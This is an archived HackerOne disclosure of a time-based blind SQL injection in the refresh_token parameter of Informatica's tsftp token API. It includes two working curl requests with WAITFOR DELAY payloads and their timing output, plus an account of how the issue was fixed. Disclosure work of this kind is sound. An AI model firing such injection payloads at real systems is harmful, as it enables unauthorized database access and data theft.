---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
  - vuln/sql-injection
  - vuln/code-injection
  - vuln/authentication-bypass
  - impact/rce
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2020-11-16
submitted: 2020-11-14T17:39:02.567Z
bounty_usd: null
votes: 68
cve: []
program: "[[programs/informatica|Informatica]]"
reporter: "r1pley"
source: "https://hackerone.com/reports/1034625"
title: "Blind SQL injection at tsftp.informatica.com"
---
# Blind SQL injection at tsftp.informatica.com

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 68 | **Program:** Informatica | **Disclosed:** 2020-11-16

- Report: [https://hackerone.com/reports/1034625](https://hackerone.com/reports/1034625)
- CWE: SQL Injection
- Submitted: 2020-11-14T17:39:02.567Z

## Report summary

Researcher identified a time based/blind SQL injection in an Informatica TSFTP website and responsibly disclosed via this report. 

Informatica's incident response team engaged within minutes of the report being received, bringing the site offline for maintenance as the issue was resolved. Following resolution of the issue and confirmation from our security team the site was brought back online. Additionally web server access logs and database logs from before the issue existed were reviewed, showing the issue had not been exploited by any malicious attackers.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

The parameter `refresh_token` sent to the REST path /api/v1/token is vulnerable to blind SQL injection.

Compare the response time of these 2 requests:

```
$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 1% cpu 2.048 total
```

vs

```
$ time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
{"error":"invalid_grant"}curl -X POST "https://tsftp.informatica.com/api/v1/token" -H  -H  -d   0.02s user 0.01s system 0% cpu 14.045 total
```
and notice that the WAITFOR DELAY command is executed.

## Impact

Blind SQL injection can be exploited to exfiltrate data from the FTP server, bypass authentication or for remote code execution.

I stopped my testing at the time-based PoC because I didn't want to risk accessing sensitive data. If you would like to though, I can continue exploiting this vulnerability to present the above impact in practice, eg by getting the database version string.

## Timeline

- **Report Filed**
- **2020-11-14** @nheffernan: Hi @r1pley  - thanks for your report. We are investigating and will be in touch.
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2021-02-28** @aks_infa: Hi @r1pley  We have updated our "Hall of Fame" page.
You can find your name here: https://www.informatica.com/trust-center/security-researcher-hall-of-fame.html
Thank you again for your effort.
